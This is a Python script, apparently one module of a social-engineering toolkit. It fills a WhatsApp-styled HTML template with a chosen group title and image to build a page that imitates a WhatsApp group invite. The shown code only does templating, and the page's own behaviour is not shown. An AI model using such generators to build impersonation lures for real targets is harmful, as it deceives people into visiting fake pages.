#!/usr/bin/env python3

import os
import shutil
import utils

from colorama import init

init()
from colorama import Fore

R = Fore.RED
G = Fore.GREEN
C = Fore.CYAN
Y = Fore.YELLOW
W = Fore.RESET

title = os.getenv('TITLE')
image = os.getenv('IMAGE')

if title is None:
    title = input(f'{G}[+] {C}Group Title : {W}')
else:
    utils.print(f'{G}[+] {C}Group Title :{W} '+title)

if image is None:
    image = input(f'{G}[+] {C}Path to Group Img (Best Size : 300x300): {W}')
else:
    utils.print(f'{G}[+] {C}Group Image :{W} '+image)

img_name = utils.downloadImageFromUrl(image, 'template/whatsapp/images/')
if img_name :
    img_name = img_name.split('/')[-1]
else:
    img_name = image.split('/')[-1]
    try:
        shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
    except Exception as e:
        utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
        exit()

with open('template/whatsapp/index_temp.html', 'r',encoding='utf-8') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp/index.html', 'w',encoding='utf-8') as new_index:
    new_index.write(code)